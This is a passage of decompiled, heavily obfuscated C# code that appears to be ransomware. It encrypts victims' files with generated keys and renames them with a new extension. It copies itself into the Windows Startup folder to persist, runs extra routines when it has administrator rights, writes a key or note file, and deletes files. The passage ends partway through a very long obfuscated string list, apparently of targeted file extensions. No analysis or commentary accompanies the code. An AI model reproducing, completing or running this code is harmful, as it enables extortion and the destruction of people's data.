							}
							catch (Exception ex6)
							{
								if (qphnWLJhmOUolrV)
								{
									try
									{
										File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107477348) + ex6.Message + getString_0(107396430));
									}
									catch (Exception)
									{
									}
								}
								CfPnwVRgYaXy++;
								return;
							}
							if (YZBBEXJSEfzFSqOL != getString_0(107462022))
							{
								CS_0024_003C_003E8__locals0.jHcqeHIPeN += YZBBEXJSEfzFSqOL;
							}
							if (NgNETKMlSjJng == getString_0(107396747))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in chWKKaOgedu)
									{
										if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.QUdXahSqDeWDNP.YZBBEXJSEfzFSqOL) && fWqlqykUBEVkds == ZXZgprhWxBP.getString_0(107396753))
										{
											if (Convert.ToInt32(wQqHVBAZmaYqT) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jHcqeHIPeN).Length)
											{
												try
												{
													XCKLADindvJZ.nhXRXZDxbmMGwhokOT(ZXZgprhWxBP.getString_0(107368564), ZXZgprhWxBP.getString_0(107368559), ZXZgprhWxBP.getString_0(107368578), CS_0024_003C_003E8__locals0.jHcqeHIPeN);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.jHcqeHIPeN.ToLower().EndsWith(item) && fWqlqykUBEVkds == ZXZgprhWxBP.getString_0(107397182))
										{
											try
											{
												XCKLADindvJZ.nhXRXZDxbmMGwhokOT(ZXZgprhWxBP.getString_0(107368564), ZXZgprhWxBP.getString_0(107368559), ZXZgprhWxBP.getString_0(107368578), CS_0024_003C_003E8__locals0.jHcqeHIPeN);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = SznTIlYhfLTN.eXlzrfSfGzN(32);
							string s = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dVeczuFsmFhaWQ == getString_0(107397176))
							{
								byte[] array = null;
								byte[] byte_ = YkOjxnmurVCfbj.QfkbKHDJftu(CS_0024_003C_003E8__locals0.jHcqeHIPeN, Convert.ToInt32(WsRteVdKTkKpED) * 1024 * 1024);
								if (!YkOjxnmurVCfbj.QNMHgTJICNuFwEj(aZxQiYswrzEMHo: (!xIEYdRogbJjk) ? (DfXjMyctTQk ? YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YkOjxnmurVCfbj.WsadWEYMhPkNa(byte_, Encoding.ASCII.GetBytes(UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DfXjMyctTQk ? NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NVikUgaKetXUZt.GbzVpJVLoYrET(byte_, Encoding.ASCII.GetBytes(UOfCooZEtXM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qtBBAGkzVvLoDw: CS_0024_003C_003E8__locals0.jHcqeHIPeN, BPtIRqUKxRmcJT: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!DfXjMyctTQk)
							{
								if (!KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.jHcqeHIPeN, WsRteVdKTkKpED, UOfCooZEtXM))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!KEPDVlpbgsoad.kCRjVccpOKvz(CS_0024_003C_003E8__locals0.jHcqeHIPeN, WsRteVdKTkKpED, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (JaGTzvkqDZS)
							{
								YZBBEXJSEfzFSqOL = WorQZGhMrwJuixubIO + YZBBEXJSEfzFSqOL;
							}
							string text2 = SznTIlYhfLTN.eXlzrfSfGzN(32);
							string s2 = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (YZBBEXJSEfzFSqOL != getString_0(107462022))
							{
								if (!tEHYMAajqyQN)
								{
									if (!DfXjMyctTQk)
									{
										lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
									}
									else
									{
										lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!DfXjMyctTQk)
										{
											UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, fDTUzhDlmgg);
										}
										else
										{
											UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex11)
									{
										if (qphnWLJhmOUolrV)
										{
											try
											{
												File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107462040) + ex11.Message + getString_0(107396430));
											}
											catch (Exception)
											{
											}
										}
										CfPnwVRgYaXy++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, CS_0024_003C_003E8__locals0.jHcqeHIPeN);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!tEHYMAajqyQN)
							{
								if (!DfXjMyctTQk)
								{
									lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107462049), fDTUzhDlmgg);
								}
								else
								{
									lnQkjKFYbeSHtD(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107462049), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!DfXjMyctTQk)
									{
										UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN, fDTUzhDlmgg);
									}
									else
									{
										UaSzdRmAlgEilgQY(CS_0024_003C_003E8__locals0.jHcqeHIPeN, CS_0024_003C_003E8__locals0.jHcqeHIPeN, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex14)
								{
									if (qphnWLJhmOUolrV)
									{
										try
										{
											File.AppendAllText(GqXvKuGfqke, getString_0(107461784) + CS_0024_003C_003E8__locals0.jHcqeHIPeN + getString_0(107462040) + ex14.Message + getString_0(107396430));
										}
										catch (Exception)
										{
										}
									}
									CfPnwVRgYaXy++;
									return;
								}
							}
							if (DfXjMyctTQk)
							{
								if (YZBBEXJSEfzFSqOL != getString_0(107462022))
								{
									jIMiBnTvhHRYVy(CS_0024_003C_003E8__locals0.jHcqeHIPeN + YZBBEXJSEfzFSqOL, bytes2);
								}
								else
								{
									jIMiBnTvhHRYVy(CS_0024_003C_003E8__locals0.jHcqeHIPeN, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1000;
			IL_1000:
			GNntzJbksCJrMo.Remove(CS_0024_003C_003E8__locals0.jHcqeHIPeN);
		}

		static cjHnGtYwZMHzv()
		{
			Strings.CreateGetStringDelegate(typeof(cjHnGtYwZMHzv));
		}
	}

	private sealed class kVtitiYGHzxvpcH
	{
		public string pbeGHysKIBJDSm;

		public string HNPIPTDlSQjg;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(pbeGHysKIBJDSm);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(HNPIPTDlSQjg))
					{
						File.Delete(HNPIPTDlSQjg);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string xTxFXXfbdYYKqKr;

	public static byte[] fDTUzhDlmgg;

	public static string vwwbhwOABO;

	public static string UZIiquGHnbBZH;

	public static List<string> vjXOwyOsZFHuY;

	public static List<string> YoDewAClrMWW;

	public static string eyrrZwSCYTADi;

	public static string UOfCooZEtXM;

	public static string CVJRzPfpAOOaE;

	public static string OfisjkQgBaKT;

	public static int jWkhxRkXbvA;

	public static string xfkNWisgyvAPU;

	public static string ziKpJPHirDj;

	public static string kgvNCYAsIRXtAPvIa;

	public static string QybvCJOZUSCUZ;

	public static string axzEDgTUby;

	public static string RqmXVZQFWCu;

	public static string luhpGRdnkbFP;

	public static string ZVpOsTOahvYy;

	public static List<string> ROHCjzwysDWe;

	public static List<string> nfYRZbrPjpWWw;

	public static string zwxjPZelNXY;

	public static string sZmFuXSSTt;

	public static string vupRuLVRMiFn;

	public static List<string> UdjWdPcrsN;

	public static string GoYBdoxJtLgwHQ;

	private static string WmSdtnBtFGZ;

	public static string uUqSvzVKAfyGAz;

	public static string SLRbFHPPhKk;

	public static List<string> YtCxXntkhTkUk;

	public static List<string> xEsusUJpPleGEu;

	public static List<string> WcWfRegXKTTamv;

	public static List<string> RWyHSlEBUZLMaY;

	public static string jRkHacbmdHPVi;

	public static List<string> nRyHvPuGTGYjWsbq;

	public static List<string> oWIHAvJtbtFMU;

	public static string tBGeLHoFvcy;

	public static string qCxjqMREBDIxz;

	internal static DateTime RaafVLqcghpsV;

	internal static DateTime pplUelDGHuSK;

	public static string tiRzeTZfFqxZgzU;

	public static string WsRteVdKTkKpED;

	public static string xstAsCXBKaQC;

	public static string iZDDkxJigpgZ;

	public static string AEUOIlHtMhD;

	public static string rsDBKVhSeGajZ;

	public static string hRpKPprDobNK;

	public static string NgNETKMlSjJng;

	public static List<string> chWKKaOgedu;

	public static string fWqlqykUBEVkds;

	public static string wQqHVBAZmaYqT;

	public static string XiehLKdjkwhtY;

	public static string VBShylEsNUYfMi;

	public static string HLBdOPVdAJ;

	public static string yMxnBnnzZwyRqt;

	public static string gkNjBSIByXQLy;

	public static string WrETenYYrsTSs;

	public static string pdgCKKhrrBHZnX;

	public static string jmjaTLfeuxPg;

	public static string lTtDZSKOub;

	public static string WKkmdZcykHMfX;

	public static string DRKkoXveZyqfNNiQ;

	public static string wqbriLFZDnLpH;

	public static string pOdPmMHlUjg;

	public static string cesTZZkUdNCNFeq;

	public static string XyKjfboizG;

	public static string hDmutTgGdvYmUFmT;

	public static string KxRJFZSBGpiT;

	public static string eUsvqxZnDWYVdQ;

	public static string dMyOPFWbNnAP;

	public static string ODgCciaivko;

	public static string mgesYTxzqcBoi;

	public static string flvVRSkBnkX;

	public static string jFdtIHbULOcM;

	public static string qAJMAzUrnidgbg;

	public static string dVeczuFsmFhaWQ;

	public static string AhVMMnudDD;

	public static string NQNKoSWmegHO;

	public static string[] pNHGfyiizpSvpI;

	public static string HTIndamVwXrIE;

	public static bool xIEYdRogbJjk;

	public static string FFKPaIgUHZxbh;

	public static bool DfXjMyctTQk;

	public static bool WnxZrIzpuZegR;

	public static bool ZHiPyHFLGBwCsE;

	public static bool QufKUxajeWOAYn;

	public static string GqXvKuGfqke;

	public static bool qphnWLJhmOUolrV;

	public static bool lljRpMchpQANYhL;

	public static bool RNdzTDKHNMZhNO;

	public static bool cgnsxMDVCroTQ;

	public static bool tEHYMAajqyQN;

	public static string TajfgxbHDQDsSZ;

	public static bool IrtcteVbDJMbKD;

	public static Stopwatch zEEvkNDfGVVq;

	public static int CfPnwVRgYaXy;

	public static int eHvSFFSwlBBvD;

	public static bool JaGTzvkqDZS;

	public static string WorQZGhMrwJuixubIO;

	public static string[] dJEmgfWDQYEuJ;

	public static List<string> IgXzUHzesBra;

	public static int rrxeEOhCBbfFLgvV;

	public static List<string> LQjZyQoCuAgVY;

	public static List<string> uKEflmkVFgJo;

	public static List<string> CJBNHOpeQKJec;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			VAtvyvEdeDhiTYl CS_0024_003C_003E8__locals0 = new VAtvyvEdeDhiTYl();
			CS_0024_003C_003E8__locals0.QqjPMSAEacSfmu = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.QqjPMSAEacSfmu) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			OhZSTsashxXp.OokEgSYHMrOun(WmSdtnBtFGZ);
		}
		catch (Exception)
		{
		}
		try
		{
			if (qAJMAzUrnidgbg == getString_0(107396727))
			{
				Thread thread = new Thread(fJAbDQmAmbauO.IWZHcIRbTIfgJ);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (kgvNCYAsIRXtAPvIa == getString_0(107396727))
		{
			Thread.Sleep(int.Parse(QybvCJOZUSCUZ));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && hRpKPprDobNK == getString_0(107396727))
		{
			try
			{
				aoDrPiciJh(DRlXtEGdcAr(getString_0(107396722)));
			}
			catch
			{
			}
		}
		try
		{
			if (luhpGRdnkbFP == getString_0(107396727) && nknqpoEupObL.skYwFNtaBcut())
			{
				new VhIWhLFJdmCNQ().LIQomKosqhdxc(bool_0: false);
				nknqpoEupObL.vRpBAuzsHdcd();
			}
		}
		catch (Exception)
		{
		}
		if (sZmFuXSSTt == getString_0(107396727) && nknqpoEupObL.skYwFNtaBcut())
		{
			new VhIWhLFJdmCNQ().LIQomKosqhdxc(bool_0: false);
			new VhIWhLFJdmCNQ().CkwuJlusrbtIxa();
		}
		if (ziKpJPHirDj == getString_0(107396727))
		{
			PXOyUsDgRXy.PwiyBiQXukrQoYRxP();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397161);
			string text2 = text + Path.GetFileName(fileName);
			if (OfisjkQgBaKT == getString_0(107396727) && fileName != text2)
			{
				Thread thread2 = new Thread(HspEkwjmGD);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (eyrrZwSCYTADi == getString_0(107396727) && mainModule != null && fileName != text2)
			{
				try
				{
					jWkhxRkXbvA = RAUpfuEJjyxg(0, ROHCjzwysDWe.Count);
					File.Copy(fileName, text + ROHCjzwysDWe[jWkhxRkXbvA], overwrite: true);
					Process.Start(text + ROHCjzwysDWe[jWkhxRkXbvA]);
					qWuBXxnBId();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (tBGeLHoFvcy == getString_0(107396727) && DateTime.Now < RaafVLqcghpsV)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (qCxjqMREBDIxz == getString_0(107396727) && DateTime.Now > pplUelDGHuSK)
			{
				qWuBXxnBId();
			}
		}
		catch
		{
		}
		wfwltMFpsA();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = xEsusUJpPleGEu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461455)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> wcWfRegXKTTamv = WcWfRegXKTTamv;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), string_0);
					};
				}
				Parallel.ForEach(wcWfRegXKTTamv, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (NQNKoSWmegHO == getString_0(107396727))
				{
					string[] source2 = pNHGfyiizpSvpI;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461442)), getString_0(107461417) + string_0 + getString_0(107461376));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!MobVTSLPgWz().Contains(getString_0(107462110)))
				{
					mNXtAeoohfKy(jRkHacbmdHPVi);
				}
				else
				{
					List<string> rWyHSlEBUZLMaY = RWyHSlEBUZLMaY;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							VKiZFXRXdSmDy(DRlXtEGdcAr(XVYVEQqAqPwoG(getString_0(107461371))), string_0);
						};
					}
					Parallel.ForEach(rWyHSlEBUZLMaY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = nRyHvPuGTGYjWsbq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						VKiZFXRXdSmDy(DRlXtEGdcAr(getString_0(107461378)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (DRKkoXveZyqfNNiQ == getString_0(107397156))
		{
			TWDqJQgPDAdnhm();
		}
		if (DRKkoXveZyqfNNiQ == getString_0(107396727))
		{
			try
			{
				ADQHxGJJJKSlJb();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZHiPyHFLGBwCsE)
			{
				try
				{
					Thread thread4 = new Thread(nYCaNltUniIEY.mpaMAUOMmRxTUo);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			VKiZFXRXdSmDy(getString_0(107397119), DRlXtEGdcAr(getString_0(107397106)));
		}
		if (zwxjPZelNXY == getString_0(107396727) && qrNfhlFPRfzWk() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(HSPEpTDPLKNFw.gARCEYgWsmXyu);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = SLRbFHPPhKk == getString_0(107396727);
		SecureString secureString = new SecureString();
		if (xstAsCXBKaQC == getString_0(107397156))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			UOfCooZEtXM = getString_0(107397065);
		}
		CVJRzPfpAOOaE = YYqwPFDAXdJ.cKyevcNdVhPKbErXE(DaNjtiFanUZ(secureString));
		if (WrETenYYrsTSs == getString_0(107396727))
		{
			cBAbybSoLrvK();
		}
		if (RNdzTDKHNMZhNO)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), TajfgxbHDQDsSZ)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), TajfgxbHDQDsSZ), string.Concat(DRlXtEGdcAr(getString_0(107396988)), new WebClient().DownloadString(DRlXtEGdcAr(getString_0(107396995))), getString_0(107396410), DRlXtEGdcAr(getString_0(107396405)), DateTime.Now, getString_0(107396410), DRlXtEGdcAr(getString_0(107396396)), CVJRzPfpAOOaE));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), TajfgxbHDQDsSZ), getString_0(107396307) + CVJRzPfpAOOaE);
				}
			}
			catch (Exception ex7)
			{
				if (qphnWLJhmOUolrV)
				{
					try
					{
						File.AppendAllText(GqXvKuGfqke, getString_0(107396278) + ex7.Message + getString_0(107396410));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		kcQTmFnmHHrpqfwRls.QYXQFphTiVJGZKL(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), eUsvqxZnDWYVdQ), jHFPZVFjoxP(CVJRzPfpAOOaE), null, null, getString_0(107396261), getString_0(107396212), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			QdGFDEFkCBx();
		}
		try
		{
			try
			{
				if (IrtcteVbDJMbKD)
				{
					Console.WriteLine(getString_0(107396227));
				}
			}
			catch
			{
			}
			rPrefpPNnAJc(new string[1] { getString_0(107396658) }, new string[2658]
			{
				getString_0(107396681),
				getString_0(107396676),
				getString_0(107396639),
				getString_0(107396634),
				getString_0(107396629),
				getString_0(107396656),
				getString_0(107396651),
				getString_0(107396646),
				getString_0(107396641),
				getString_0(107396604),
				getString_0(107396599),
				getString_0(107396594),
				getString_0(107396621),
				getString_0(107396616),
				getString_0(107396611),
				getString_0(107396574),
				getString_0(107396569),
				getString_0(107396564),
				getString_0(107396587),
				getString_0(107396582),
				getString_0(107396577),
				getString_0(107396540),
				getString_0(107396531),
				getString_0(107396558),
				getString_0(107396553),
				getString_0(107396548),
				getString_0(107396511),
				getString_0(107396502),
				getString_0(107396497),
				getString_0(107396524),
				getString_0(107396519),
				getString_0(107396514),
				getString_0(107396477),
				getString_0(107396472),
				getString_0(107396495),
				getString_0(107396490),
				getString_0(107396485),
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395926),
				getString_0(107395921),
				getString_0(107395948),
				getString_0(107395939),
				getString_0(107395902),
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395919),
				getString_0(107395914),
				getString_0(107395905),
				getString_0(107395868),
				getString_0(107395863),
				getString_0(107395858),
				getString_0(107395885),
				getString_0(107395880),
				getString_0(107395875),
				getString_0(107395838),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395855),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395822),
				getString_0(107395817),
				getString_0(107395812),
				getString_0(107395775),
				getString_0(107395770),
				getString_0(107395765),
				getString_0(107395792),
				getString_0(107395783),
				getString_0(107395742),
				getString_0(107395733),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395709),
				getString_0(107395704),
				getString_0(107395699),
				getString_0(107396178),
				getString_0(107396197),
				getString_0(107396148),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396161),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396114),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396131),
				getString_0(107396090),
				getString_0(107396081),
				getString_0(107396104),
				getString_0(107396099),
				getString_0(107396058),
				getString_0(107396053),
				getString_0(107396080),
				getString_0(107396075),
				getString_0(107396070),
				getString_0(107396065),
				getString_0(107396028),
				getString_0(107396019),
				getString_0(107396046),
				getString_0(107396041),
				getString_0(107395996),
				getString_0(107395991),
				getString_0(107395986),
				getString_0(107396009),
				getString_0(107395968),
				getString_0(107395955),
				getString_0(107395974),
				getString_0(107395417),
				getString_0(107395436),
				getString_0(107395391),
				getString_0(107395378),
				getString_0(107395397),
				getString_0(107395352),
				getString_0(107395371),
				getString_0(107395366),
				getString_0(107395361),
				getString_0(107395324),
				getString_0(107395315),
				getString_0(107395342),
				getString_0(107395337),
				getString_0(107395332),
				getString_0(107395295),
				getString_0(107395290),
				getString_0(107395285),
				getString_0(107395312),
				getString_0(107395307),
				getString_0(107395298),
				getString_0(107395257),
				getString_0(107395280),
				getString_0(107395271),
				getString_0(107395266),
				getString_0(107395229),
				getString_0(107395220),
				getString_0(107395243),
				getString_0(107395234),
				getString_0(107395197),
				getString_0(107395192),
				getString_0(107395187),
				getString_0(107395214),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395675),
				getString_0(107395670),
				getString_0(107395665),
				getString_0(107395692),
				getString_0(107395683),
				getString_0(107395646),
				getString_0(107395641),
				getString_0(107395636),
				getString_0(107395663),
				getString_0(107395658),
				getString_0(107395653),
				getString_0(107395616),
				getString_0(107395611),
				getString_0(107395606),
				getString_0(107395601),
				getString_0(107395624),
				getString_0(107395619),
				getString_0(107395582),
				getString_0(107395573),
				getString_0(107395600),
				getString_0(107395595),
				getString_0(107395590),
				getString_0(107395549),
				getString_0(107395544),
				getString_0(107395567),
				getString_0(107395558),
				getString_0(107395553),
				getString_0(107395516),
				getString_0(107395511),
				getString_0(107395506),
				getString_0(107395533),
				getString_0(107395528),
				getString_0(107395523),
				getString_0(107395486),
				getString_0(107395481),
				getString_0(107395476),
				getString_0(107395503),
				getString_0(107395494),
				getString_0(107395453),
				getString_0(107395448),
				getString_0(107395443),
				getString_0(107395470),
				getString_0(107395461),
				getString_0(107394912),
				getString_0(107394907),
				getString_0(107394902),
				getString_0(107394925),
				getString_0(107394920),
				getString_0(107394879),
				getString_0(107394874),
				getString_0(107394865),
				getString_0(107394892),
				getString_0(107394883),
				getString_0(107394846),
				getString_0(107394841),
				getString_0(107394864),
				getString_0(107394859),
				getString_0(107394854),
				getString_0(107394849),
				getString_0(107394804),
				getString_0(107394831),
				getString_0(107394798),
				getString_0(107394793),
				getString_0(107394788),
				getString_0(107394751),
				getString_0(107394746),
				getString_0(107394741),
				getString_0(107394768),
				getString_0(107394763),
				getString_0(107394758),
				getString_0(107394753),
				getString_0(107394716),
				getString_0(107394711),
				getString_0(107394706),
				getString_0(107394729),
				getString_0(107394724),
				getString_0(107394687),
				getString_0(107394682),
				getString_0(107394677),
				getString_0(107394700),
				getString_0(107394691),
				getString_0(107395162),
				getString_0(107395157),
				getString_0(107395184),
				getString_0(107395179),
				getString_0(107395170),
				getString_0(107395129),
				getString_0(107395148),
				getString_0(107395143),
				getString_0(107395138),
				getString_0(107395097),
				getString_0(107395112),
				getString_0(107395071),
				getString_0(107395066),
				getString_0(107395061),
				getString_0(107395088),
				getString_0(107395083),
				getString_0(107395074),
				getString_0(107395037),
				getString_0(107395052),
				getString_0(107395047),
				getString_0(107395006),
				getString_0(107395001),
				getString_0(107394996),
				getString_0(107395023),
				getString_0(107395018),
				getString_0(107395013),
				getString_0(107394976),
				getString_0(107394971),
				getString_0(107394962),
				getString_0(107394989),
				getString_0(107394984),
				getString_0(107394943),
				getString_0(107394934),
				getString_0(107394957),
				getString_0(107394952),
				getString_0(107394947),
				getString_0(107394398),
				getString_0(107394393),
				getString_0(107394388),
				getString_0(107394411),
				getString_0(107394406),
				getString_0(107394401),
				getString_0(107394364),
				getString_0(107394359),
				getString_0(107394354),
				getString_0(107394377),
				getString_0(107394328),
				getString_0(107394323),
				getString_0(107394350),
				getString_0(107394345),
				getString_0(107394340),
				getString_0(107394303),
				getString_0(107394298),
				getString_0(107394293),
				getString_0(107394320),
				getString_0(107394315),
				getString_0(107394310),
				getString_0(107394305),
				getString_0(107394268),
				getString_0(107394263),
				getString_0(107394258),
				getString_0(107394285),
				getString_0(107394280),
				getString_0(107394239),
				getString_0(107394234),
				getString_0(107394225),
				getString_0(107394248),
				getString_0(107394243),
				getString_0(107394206),
				getString_0(107394201),
				getString_0(107394224),
				getString_0(107394219),
				getString_0(107394214),
				getString_0(107394209),
				getString_0(107394172),
				getString_0(107394167),
				getString_0(107394162),
				getString_0(107394185),
				getString_0(107394180),
				getString_0(107394651),
				getString_0(107394646),
				getString_0(107394641),
				getString_0(107394664),
				getString_0(107394659),
				getString_0(107394622),
				getString_0(107394617),
				getString_0(107394612),
				getString_0(107394639),
				getString_0(107394634),
